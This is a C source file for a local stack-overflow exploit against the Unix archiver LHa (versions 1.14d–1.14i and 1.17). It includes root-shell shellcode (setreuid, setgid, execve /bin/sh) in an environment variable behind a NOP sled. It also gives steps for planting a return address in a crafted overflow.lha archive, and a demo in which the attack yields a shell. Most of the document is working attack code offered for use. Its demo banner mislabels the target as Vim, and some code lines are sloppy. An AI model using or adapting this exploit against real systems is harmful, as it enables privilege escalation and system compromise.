/* Author : N4rK07IX  narkotix@linuxmail.org

  Bug Found By : Ulf Ha"rnhammar <Ulf.Harnhammar.9485@student.uu.se> 

LHa buffer overflows and directory traversal problems


PROGRAM: LHa (Unix version)
VENDOR: various people
VULNERABLE VERSIONS: 1.14d to 1.14i            // Theze sectionz completely taken from full-disclosure :))
                     1.17 (Linux binary)
                     possibly others
IMMUNE VERSIONS: 1.14i with my patch applied
                 1.14h with my patch applied

Patch : Ulf Ha"rnhammar made some patch U can find it on :
          LHa 1.14: http://www2m.biglobe.ne.jp/~dolphin/lha/lha.htm
	  http://www2m.biglobe.ne.jp/~dolphin/lha/prog/
          LHa 1.17: http://www.infor.kanazawa-it.ac.jp/~ishii/lhaunix/


---------------------------------------------------------------

Little Explanation about Exploit : Copy the attached overflow.lha file to your directory , i.e /home
Then open overflow.lha with text editor(vim is better), U will see there four bytes XXXX at the end of the line, just
delete XXXX and paste your ASCII RET address there,but make sure not to malform the file.Then run the sploit.

Note : overflow.lha file is completely taken from Ulf's post.

Demo:

addicted@labs:~/c-hell$ ./lha /home/addicted/overflow.lha 
--------------------------------------------------
| Author : N4rK07IX
| Vim 6.x Local Xpl0it
| narkotix@linuxmail.org
|--------------------------------------------------
[+] RET ADDRESS = 0xbffffd90
[!] Paste These ASCII 4 bytes Ret Adress to the XXXX in the file overflow.lha
[!] ASCII RET ADDR = ê˝ˇø
[+] Exploiting the buffer..
LHa: Error: Unknown information 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUAAAAAAAê˝ˇøB
sh-2.05b$ 

Gretingz: Efnet,mathmonkey,Uz4yh4N,laplace_ex,xmlguy,gotcha,forkbomb

*/

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define BUFFERSIZE 2000
#define FEED 600 
#define PATH "/usr/bin/lha"
#define PROG "lha" 

static char shellcode[] =

        //* setreuid(0,0);
        "\x31\xc0"                      // xor    %eax,%eax
        "\x31\xdb"                      // xor    %ebx,%ebx
        "\x31\xc9"                      // xor    %ecx,%ecx
        "\xb0\x46"                      // mov    $0x46,%al
        "\xcd\x80"                      // int    $0x80

        /* setgid(0); */
        "\x31\xdb"                      // xor %ebx,%ebx
        "\x89\xd8"                      // mov %ebx,%eax
        "\xb0\x2e"                      // mov $0x2e,%al
        "\xcd\x80"                      // int $0x80

        // execve /bin/sh
        "\x31\xc0"                      // xor    %eax,%eax
        "\x50"                          // push   %eax
        "\x68\x2f\x2f\x73\x68"          // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"          // push   $0x6e69622f
        "\x89\xe3"                      // mov    %esp,%ebx
        "\x8d\x54\x24\x08"              // lea    0x8(%esp,1),%edx
        "\x50"                          // push   %eax
        "\x53"                          // push   %ebx
        "\x8d\x0c\x24"                  // lea    (%esp,1),%ecx
        "\xb0\x0b"                      // mov    $0xb,%al
        "\xcd\x80"                      // int    $0x80

        // exit();
        "\x31\xc0"                      // xor    %eax,%eax
        "\xb0\x01"                      // mov    $0x1,%al
        "\xcd\x80";                     // int    $0x80


int main(int argc, char *argv[])
    
{ 
        if( argc < 2 )
        { printf("[-] Enter The Full Of the overflow.lha \n");
          exit(-1);
        }



        printf("--------------------------------------------------\n");
	printf("| Author : N4rK07IX\n");
        printf("| Found by : Ulf Ha'rnhammar\n");
	printf("| LHa 1.14d 1.14i 1.17 Local Lame Stack Overflow Sploit\n");
	printf("| narkotix@linuxmail.org\n");
	printf("|--------------------------------------------------\n");
	        
	char buffer[BUFFERSIZE];   
	char addict[FEED];
	
	int i,
	    *adr_pointer,
	    *addict_pointer;
	    
	memset(addict,0x90,sizeof(addict));
        memcpy(&addict[FEED-strlen(shellcode)],shellcode,strlen(shellcode)); 
        memcpy(addict,"ADDICT=",7);
        putenv(addict);
	
	unsigned long ret = 0XBFFFFFFA -strlen("/usr/bin/lha") - strlen(addict);
	printf("[+] RET ADDRESS = 0x%x\n",ret);
        
         char l =  (ret & 0x000000ff);
         char a =  (ret & 0x0000ff00) >> 8;
         char m =  (ret & 0x00ff0000) >> 16;
         char e =  (ret & 0xff000000) >> 24;

        



        printf("[!] Paste These ASCII 4 bytes Ret Adress to the XXXX in the file overflow.lha\n");
        printf("[!] ASCII RET ADDR = %c%c%c%c\n",l,a,m,e);
	printf("[+] Exploiting the buffer..\n");
        adr_pointer = (int *)(buffer);
	
	for(i = 0 ; i < BUFFERSIZE ; i += 4)
	*adr_pointer++ = ret;
	execl(PATH,PROG,"x",argv[1],NULL);
	if(!execl);
	perror("execl()");
	printf("[+] Done B4by\n");
	
	return 0;
}


	
	


	
           
